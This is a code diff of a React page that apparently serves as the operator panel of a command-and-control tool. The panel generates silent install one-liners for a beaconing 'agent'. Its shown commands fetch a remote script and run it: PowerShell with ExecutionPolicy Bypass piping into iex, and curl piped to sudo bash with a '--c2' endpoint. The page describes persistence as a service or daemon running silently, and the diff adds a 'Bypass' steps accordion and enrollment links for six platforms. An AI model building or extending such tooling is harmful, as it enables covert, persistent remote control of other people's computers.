                     <div style={{ color:"#6b8ab0" }}># One-liner silent install (download + run concurrently):</div>
-                    <div style={{ color:"#b8cce8" }}>{`powershell -ExecutionPolicy Bypass -c "& { $s=iwr 'https://bixtx.onrender.com/v1/agent/download/windows.ps1' -UseBasicParsing; iex $s.Content }"`}</div>
+                    <div style={{ color:"#b8cce8" }}>{`powershell -ExecutionPolicy Bypass -c "& { $s=iwr '${API_BASE}/agent/download/windows.ps1' -UseBasicParsing; iex $s.Content }"`}</div>
                     <div style={{ color:"#6b8ab0" }}># Manual: download windows.ps1 then run as Administrator</div>
                     <div style={{ color:"#b8cce8" }}>.\install.ps1 -EnrollKey BTX-WIN-XXXX -C2Url {c2Endpoint}</div>
+                    <div style={{ color:"#6b8ab0" }}># Installs as Windows Service — persists across reboots</div>
                   </>) : (<>
                     <div style={{ color:"#6b8ab0" }}># One-liner silent install (downloads + installs concurrently):</div>
-                    <div style={{ color:"#b8cce8" }}>{`curl -sSL 'https://bixtx.onrender.com/v1/agent/download/${targetOS === "macos" ? "macos" : "linux"}.sh' | sudo bash -s -- --key BTX-KEY --c2 ${c2Endpoint}`}</div>
+                    <div style={{ color:"#b8cce8" }}>{`curl -sSL '${API_BASE}/agent/download/${targetOS === "macos" ? "macos" : "linux"}.sh' | sudo bash -s -- --key BTX-KEY --c2 ${c2Endpoint}`}</div>
                     <div style={{ color:"#10b981" }}># Installs as {targetOS === "macos" ? "launchd daemon" : "systemd service"} — runs silently in background</div>
                   </>)}
+                </div>
+
+                {/* Bypass accordion */}
+                <div className="border-t" style={{ borderColor:"rgba(59,130,246,0.15)" }}>
+                  <button
+                    onClick={() => setShowBypass(b => !b)}
+                    className="w-full flex items-center justify-between px-4 py-2.5 text-xs font-bold transition-colors"
+                    style={{ color:"#f59e0b", background: showBypass ? "rgba(245,158,11,0.08)" : "transparent" }}>
+                    <div className="flex items-center gap-2">
+                      <Shield size={12} />
+                      {bypass.title}
+                    </div>
+                    {showBypass ? <ChevronUp size={12} /> : <ChevronDown size={12} />}
+                  </button>
+                  {showBypass && (
+                    <div className="px-4 pb-4 space-y-1.5">
+                      {bypass.steps.map((step, i) => (
+                        <div key={i} className="flex items-start gap-2 text-[10px] font-mono"
+                          style={{ color:"#b8cce8" }}>
+                          <span style={{ color:"#f59e0b", flexShrink:0 }}>{i + 1}.</span>
+                          <span>{step}</span>
+                        </div>
+                      ))}
+                    </div>
+                  )}
                 </div>
               </div>
 
@@ -578,14 +737,14 @@ export function LinkAgentPage({ show }: { show: (msg: string, kind?: "success"|"
                 <div className="text-xs font-mono uppercase tracking-widest mb-3" style={{ color:"#6b8ab0" }}>Agent Specifications</div>
                 <div className="grid grid-cols-2 md:grid-cols-4 gap-3">
                   {[
-                    { label:"Runtime",    val:"Node.js 18+",     icon:<Server size={13} />,    color:"#10b981" },
-                    { label:"Protocol",   val:"WebSocket / WSS", icon:<WifiIcon size={13} />,  color:"#3b82f6" },
-                    { label:"Encryption", val:"AES-256-GCM",     icon:<Lock size={13} />,      color:"#f59e0b" },
-                    { label:"Beacon",     val:`${beaconInterval}s interval`, icon:<Signal size={13} />, color:"#10d9a0" },
-                    { label:"CPU Impact", val:"<1% idle",        icon:<Activity size={13} />,  color:"#10b981" },
-                    { label:"DB",         val:"SQLite encrypted", icon:<HardDrive size={13} />, color:"#a855f7" },
-                    { label:"Platforms",  val:"6 OS supported",  icon:<Cpu size={13} />, color:"#3b82f6" },
-                    { label:"Persistence",val:"systemd / launchd / Service", icon:<Shield size={13} />, color:"#10d9a0" },
+                    { label:"Runtime",    val:"Node.js 18+",        icon:<WifiIcon size={13} />,  color:"#10b981" },
+                    { label:"Protocol",   val:"WebSocket / WSS",    icon:<WifiIcon size={13} />,  color:"#3b82f6" },
+                    { label:"Encryption", val:"AES-256-GCM",        icon:<Lock size={13} />,      color:"#f59e0b" },
+                    { label:"Beacon",     val:`${beaconInterval}s`, icon:<Signal size={13} />,    color:"#10d9a0" },
+                    { label:"CPU Impact", val:"<1% idle",           icon:<Activity size={13} />,  color:"#10b981" },
+                    { label:"DB",         val:"SQLite encrypted",   icon:<HardDrive size={13} />, color:"#a855f7" },
+                    { label:"Platforms",  val:"6 OS supported",     icon:<Cpu size={13} />,       color:"#3b82f6" },
+                    { label:"Persist",    val:"systemd/launchd/Svc",icon:<Shield size={13} />,    color:"#10d9a0" },
                   ].map(s => (
                     <div key={s.label} className="rounded-lg p-3" style={{ background:"#030b16", border:"1px solid rgba(59,130,246,0.12)" }}>
                       <div className="flex items-center gap-1.5 mb-1" style={{ color:s.color }}>{s.icon}
@@ -599,7 +758,7 @@ export function LinkAgentPage({ show }: { show: (msg: string, kind?: "success"|"
             </div>
           </div>
 
-          {/* ── 6-platform link cards (appear after Generate) ── */}
+          {/* ── 6-platform link cards ── */}
           {enrollData && Array.isArray(enrollData.links) && (
             <div className="space-y-4">
               <div className="flex items-center justify-between">
@@ -616,11 +775,11 @@ export function LinkAgentPage({ show }: { show: (msg: string, kind?: "success"|"
               <div className="grid grid-cols-1 md:grid-cols-2 xl:grid-cols-3 gap-4">
                 {enrollData.links.map(link => {
                   const pm = PLAT_META[link.platform] ?? { icon:"🖥", color:"#6b8ab0", label: link.platform };
+                  const isBinary = BINARY_PLATFORMS.includes(link.platform as BinaryPlatform);
                   const previewLines = link.installCommand.split("\n").slice(0, 2).join("\n");
                   return (
                     <div key={link.platform} className="rounded-2xl p-4 space-y-3"
                       style={{ background:"#0a1628", border:`1px solid ${pm.color}35` }}>
-                      {/* Header */}
                       <div className="flex items-center justify-between">
                         <div className="flex items-center gap-2">
                           <span className="text-xl">{pm.icon}</span>
@@ -635,7 +794,6 @@ export function LinkAgentPage({ show }: { show: (msg: string, kind?: "success"|"
                         </div>
                       </div>
 
-                      {/* Enroll URL */}
                       <div className="space-y-1">
                         <div className="text-[9px] font-mono uppercase tracking-widest" style={{ color:"#4a6080" }}>Enroll URL</div>
                         <div className="flex items-center gap-2 rounded-lg px-2.5 py-1.5"
@@ -645,7 +803,7 @@ export function LinkAgentPage({ show }: { show: (msg: string, kind?: "success"|"
                           </span>
                           <button title="Copy URL"
                             onClick={() => { navigator.clipboard.writeText(link.enrollUrl); show(`${pm.label} URL copied`, "success"); }}>
-                            <Copy size={11} color="#6b8ab0" className="hover:text-white transition-colors" />
+                            <Copy size={11} color="#6b8ab0" />
                           </button>
                           <a href={link.enrollUrl} target="_blank" rel="noreferrer" title="Open URL">
                             <ExternalLink size={11} color="#3b82f6" />
@@ -653,7 +811,6 @@ export function LinkAgentPage({ show }: { show: (msg: string, kind?: "success"|"
                         </div>
                       </div>
 
-                      {/* Install command preview */}
                       <div className="space-y-1">
                         <div className="text-[9px] font-mono uppercase tracking-widest" style={{ color:"#4a6080" }}>Install Command</div>
                         <div className="rounded-lg px-2.5 py-2" style={{ background:"#030b16", border:"1px solid rgba(59,130,246,0.12)" }}>
@@ -667,13 +824,22 @@ export function LinkAgentPage({ show }: { show: (msg: string, kind?: "success"|"
                         </div>
                       </div>
 
-                      {/* Download button */}
-                      <a href={link.downloadUrl} download target="_blank" rel="noreferrer"
-                        className="flex items-center justify-center gap-2 py-2 rounded-xl font-bold text-xs transition-all hover:opacity-90 no-underline"
-                        style={{ background:`${pm.color}18`, border:`1px solid ${pm.color}40`, color:pm.color }}>
-                        <Download size={12} />
-                        Download for {pm.label}
-                      </a>
+                      {/* Smart download — for binary platforms open in new tab (OTA or direct); scripts download directly */}
+                      {isBinary ? (
+                        <a href={link.enrollUrl} target="_blank" rel="noreferrer"
+                          className="flex items-center justify-center gap-2 py-2 rounded-xl font-bold text-xs transition-all hover:opacity-90 no-underline"
+                          style={{ background:`${pm.color}18`, border:`1px solid ${pm.color}40`, color:pm.color }}>
+                          <Download size={12} />
+                          {link.platform === "ios" ? "Open OTA Install" : `Download for ${pm.label}`}
+                        </a>
+                      ) : (
+                        <a href={link.downloadUrl} download target="_blank" rel="noreferrer"
+                          className="flex items-center justify-center gap-2 py-2 rounded-xl font-bold text-xs transition-all hover:opacity-90 no-underline"
+                          style={{ background:`${pm.color}18`, border:`1px solid ${pm.color}40`, color:pm.color }}>
+                          <Download size={12} />
+                          Download for {pm.label}
+                        </a>
+                      )}
                     </div>
                   );
                 })}
@@ -956,4 +1122,3 @@ export function LinkAgentPage({ show }: { show: (msg: string, kind?: "success"|"
     </div>
   );
 }
-
